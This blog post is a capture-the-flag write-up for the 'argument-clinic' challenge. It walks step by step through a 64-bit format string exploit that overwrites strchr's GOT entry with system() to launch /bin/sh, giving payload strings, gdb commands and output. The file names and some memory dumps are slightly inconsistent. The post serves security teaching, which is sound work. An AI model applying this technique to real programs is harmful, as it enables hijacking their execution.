---
title:  "Writeup: Argument Clinic"
date:   2019-05-03 16:00:00
categories: writeup
author: Matt McDonald
layout: post
---

Once we've familiarized ourselves with format string vulnerabilities, we can
attempt a more complicated exploit. In ```format4```, there was a convenient
"win" function, just waiting to be called. However, in a more realistic
program, there won't be a convenient function like this waiting to be called.
This calls for us to find a different way to access the flag file.

Let's take a look at the source code for the argument-clinic problem:

```
int main(int argc, char** argv) {
    char temp[1024];
    printf("Write something already.\n");
    fgets(temp, 1024, stdin);
    printf("You entered: ");
    printf(temp);
    printf("\n");
    
    if (strchr(strtok(temp, " "), 0) == temp) {
        printf("Way to enter nothing, loser.\n");
    } else {
        printf("You're still lame.\n");
    }
}
```

Clearly, we have another format string vulnerability here. The binary begins by
reading from ```stdin``` into a buffer, and then calls ```printf``` with our
input as the first argument. With a cleverly crafted exploit string, this will
allow us to read and write values on the stack. To start, we'll have to find the
offset from the top of the stack to the buffer. To do this, we add a bunch of a's
to our string, and look for the spot in memory including ```0x61```.

The argument-clinic binary happens to be 64-bit, so instead of writing four a's
like we would with the earlier ```format``` problems we'll write eight, and
instead of the ```%x``` format specifier we'll use ```%lx```, for "long hex". 

```
> python -c 'print "aaaaaaaa" + "%lx."*100' | ./argument_clinic
Write something already.
You entered: aaaaaaaa65746e6520756f59.0.0.7fc2f80914c0.7ffff55d2fa0.7ffff55d3438.1f82003f8.6161616161616161.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.2e786c252e786c25.a.0.0.1.291686517cc52.0.7fc2f8029170.7fc2f8029170.7fc2f7e18bb8.7ffff55d3310.7fc2f7e044d7.0.0.1.7fc2f8029728.7fc2f8029100.1.7fc2f80914c0.7fc2f7e0a67f.7fc2f8029710.0.0.7ffff58c2268.1958ac0.7fc2f7bb3787.7ffff55d3360.0.7fc2f8029738.1.7ffff55d32c0.3.7ffff55d32b0.0.3ae75f6.0.0.0.0.6562b026.7fc2f8029a98.7ffff55d3358.7ffff55d3390.

You're still lame.
```

Luckily for us, the 8 a's that we typed appear relatively early. Counting the arguments
tells us that they are currently argument number 8 on the stack, and we can select 
only this argument with the $ specifier:

```
python -c 'print "aaaaaaaa" + "%8$lx."' | ./argument_clinic
Write something already.
You entered: aaaaaaaa6161616161616161.

You're still lame.
```

Perfect. Now we need to figure out what to actually exploit. Presumably, we will
be using the printf to create a "write-what-where" vulnerability, but what will we
be writing, and where? Unlike the format lecture exercises, there is no magic "win"
function for us to jump to here, so we'll have to find another way to get the key.
One way to do this is by calling ```system("/bin/sh")``` to launch a shell.

Finding a way to call system is relatively easy - we could pick any of the standard
library functions called after the vulnerable printf (even printf itself would work!),
and replace it with the address of system in the Global Offset Table. The more confusing
part is finding a way to ensure that the argument passed to this function is /bin/sh.
To do this, we need to find a spot in the program where we can control the input of the
function being called. Looking back at the program, we see that other than the printf
vulnerability line itself, our only choice is this:

```
    if (strchr(strtok(temp, " "), 0) == temp) {
```

Here, ```strtok``` is called with our temp variable, which gives us potential to control
the input. However, in order to replace strtok with system in the global offset table,
we're going to need to have a very long and carefully crafted exploit string. Unfortunately,
calling system on a string that's a mix of %n and other random printing characters won't
launch a shell for us, so we'll have to find another way around.

But let's look for a second at what the code actually does - strktok, when called with
a string and the space character as the second argument, will return everything from
the input string up to the first space. This means that if we were to start our string
with, for example, "/bin/sh ", the strtok call would return just /bin/sh, which would
then be passed to strchr. So instead, our goal will to be to replace strchr with
system. 

In order to replace strchr in the GOT, we will need to find a couple addresses -
namely, system in libc, and strchr in the global offset table. We can find system
by simply running ```p system``` in gdb, and strchr by calling 
```objdump -TR argument_clinic | grep strchr```. I'll use 0x7ffff7222222 as the
address for system, and 0x601110 as the address for strchr for the rest of the
writeup.

Now we know what to write, and where to write it, so we just need to build the
actual string. Let's start by taking the python from before, and replacing all
of the a's with the address of strchr:

```
> python -c 'print "\x10\x11\x60\x00\x00\x00\x00\x00" + "%8$lx."' | ./argument_clinic
Write something already.
You entered: `
You're still lame.
```

But when we do this, our output doesn't ever print the hex value like we would
expect it to! What's different from when we did this in format4? Because this is
a 64-bit binary, our addresses are much longer, and end up having a lot of 0x00
bytes in them. The printf function, however, stops printing when it reaches a null
byte, because it thinks it's the end of the string! To get around this, we can
move the address to the end of the string instead. This way it is still loaded into
the buffer in memory, but won't stop the printing. It might take a little bit of
adjusting to make it work out nicely:

```
> python -c 'print "%9$lx---" + "\x10\x11\x60\x00\x00\x00\x00\x00"' | ./argument_clinic

Write something already.
You entered: 601110---`
You're still lame.


> python -c 'print "%9$lx---" + "\x10\x11\x60\x00\x00\x00\x00\x00"' | ./argument_clinic

Write something already.
You entered: 601110---`
You're still lame.
```

The unfortunate part about putting the address at the end is that as we add to the
string, it will change the location in memory of the address. To make this simpler,
I recommend adding to the string in multiples of 8, and increasing each of the
specifiers by 1 for every 8 characters. 

Now to figure out what to print. If we pull up python and calculate the integer value
of our address, we see that the address of system is equal to 140,737,337,360,384. 
Considering how long it took to print the address in format4, which worked out to a
few hundred million, this would take an absolutely insane amount of time to print.
So we need to find another way...

Instead of printing the entire value at once, we can try printing it piece-by-piece.
We'll need to work from the lowest bit to the highest, since the higher bits will
be replaced with zeroes every time we write. Another slight wrinkle is that, since
%n prints the number of characters written so far, we can only write increasing
values.

In order to make the exploit run faster, I've opted to write this in three chunks.
To recap, our address is 0x00 00 7f ff f7 22 22 22. First, I'll write 0x22 22 22
at the lowest three bytes. Then, I'll write 0x22 ff f7 three bytes from the start,
since we need to continue increasing and we know the 0x22 will be overwritten anyway.
Lastly, I'll write 0x01 00 00 7f five bytes from the start, to replace the 22 and
fill the rest with zeroes. This will have the side effect of putting a 01 in the next
entry of the GOT, but it won't matter after our program launches a shell anyway.

Lets do a little more setup with our exploit string before we start adding in these
massive values. First, we'll add "/bin/sh " (which, conveniently, is exactly 8
characters) at the beginning and update the offsets accordingly:

```
> python -c 'print "/bin/sh %10$lx--" + "\x10\x11\x60\x00\x00\x00\x00\x00"' | ./argument_clinic
Write something already.
You entered: /bin/sh 601110--`
You're still lame.
```

Then, we'll add the two extra addresses: one at 0x601113, and one at 0x601115 - 
3 and 5 bytes after the start of the GOT entry. Since the two extra specifiers
are both an additional 8 characters, we need to increase the first specifier
to index 12, and the two new ones will be 13 and 14.

```
> python -c 'print "/bin/sh %12$lx--" + "%13$lx.." + "%14$lx.." + "\x10\x11\x60\x00\x00\x00\x00\x00\x13\x11\x60\x00\x00\x00\x00\x00\x15\x11\x60\x00\x00\x00\x00\x00"' | ./argument_clinic
Write something already.
You entered: /bin/sh 601110--601113..601115..`
You're still lame.
```

Lastly, I'll add some extra spaces to leave room for us to play around with
really large %d tags without having to worry about offsets. Since we might
be printing 9-digit numbers in some cases, I'm going to add 16 spaces for
each of the three prints.

```
> python -c 'print "/bin/sh " + "................" + "%18$lx.." + "................" + "%19$lx.." + "................" + "%20$lx.." + "\x10\x11\x60\x00\x00\x00\x00\x00\x13\x11\x60\x00\x00\x00\x00\x00\x15\x11\x60\x00\x00\x00\x00\x00"' | ./argument_clinic
Write something already.
You entered: /bin/sh ................601110..................601113..................601115..`
You're still lame.
```

Now for the actual value writing. To make it easier to check that our exploit
is working at each step, we're going to want to run this in GDB. As a side note,
in GDB, if you run a program with something like ```r <<< $(python -c 'print "\x00\x61"')```, 
GDB will actually strip the null bytes from your input string, and therefore mess 
up a big part of our exploit. To get this to work in GDB, we'll want to run the python
command outside of GDB and save the output to a file (something like ```~/x1.txt``` so it's
fast to type). Then, in GDB, you run the program as ```r < ~/x1.txt```. 

To find the three values for our printing, we'll first convert the three hex values we
plan to write to decimal. 0x22 22 22 becomes 2236962, 0x22 ff f7 becomes 2293751, and
0x01 00 00 7f becomes 16777343. Since we're already printing 8 characters of /bin/sh,
our first specifier will be printing 2236962 - 8, or 2236954. To accomplish this,
we can do something like %2236954d, which will print a value from the stack padded to
be exactly 2,236,954 characters long. Let's add this first one in, and switch the
corresponding %lx to a %n so that it actually writes the value. Remember to delete or
add periods as necessary, to ensure that everything stays aligned properly:

```
> python -c 'print "/bin/sh " + "%2236954d......." + "%18$n..." + "................" + "%19$lx.." + "................" + "%20$lx.." + "\x10\x11\x60\x00\x00\x00\x00\x00\x13\x11\x60\x00\x00\x00\x00\x00\x15\x11\x60\x00\x00\x00\x00\x00"' > \~/p1.txt

(gdb) r < ~/x1.txt
```

If we add a breakpoint before running it, then we can check if our value was correctly
written after the printing finishes:

```
(gdb) x/4xw 0x601110
0x601110:      0x90222222      0x12345678      0x00000000      0x00000000
```

Perfect! We've written the bottom three bytes. If your values are slightly off,
you can add or remove to the value of the %d specifier accordingly. Next, we need
to write a value equal to 2,293,751. Since we've already written 2,236,962, we
only need to write 56,789 more characters. We can subtract 8 characters for the
specifier and 7 for the periods, so we'll try writing 56,774.

```
> python -c 'print "/bin/sh " + "%2236954d......." + "%18$n..." + "%56774d........." + "%19$n..." + "................" + "%20$lx.." + "\x10\x11\x60\x00\x00\x00\x00\x00\x13\x11\x60\x00\x00\x00\x00\x00\x15\x11\x60\x00\x00\x00\x00\x00"' > \~/p1.txt

(gdb) r < ~/x1.txt
(gdb) x/4xw 0x601110
0x601110:      0xf7222222      0x000022ff      0x00000000      0x00000000
```

So far so good. The last value we need to print is the biggest. Once again,
we can subtract what we've already printed, the length of the additional
specifier, and the extra periods, giving us 14483575 left to print.

```
> python -c 'print "/bin/sh " + "%2236954d......." + "%18$n..." + "%56774d........." + "%19$n..." + "%14483575d......" + "%20$n..." + "\x10\x11\x60\x00\x00\x00\x00\x00\x13\x11\x60\x00\x00\x00\x00\x00\x15\x11\x60\x00\x00\x00\x00\x00"' > \~/p1.txt

(gdb) r < ~/x1.txt
(gdb) x/4xw 0x601110
0x601110:      0xf7222222      0x00007fff      0x00000000      0x00000000
```

Perfect! Now that the address of system has replaced strchr, when the code reaches
the if statement, it should successfully call system("/bin/sh") and launch a shell.
Lets go outside of gdb and run it again to see if it works, with an extra cat as we've
done in other shell-launching binaries:

```
> (cat ~/x1.txt; cat) | ./argument_clinic
```

If the values were all properly configured, a shell will be launched and we can
simply ```cat flag.txt```! 




Note: If, while working on this, you encounter a "printf positional" error, this usually means
you are trying to write in an invalid place. Try replacing the %n that's failing with a 
%lx again, and make sure it still prints the address as you expect. If not, there might
be an alignment issue - double check all of the specifiers, and add/remove spacing as
needed.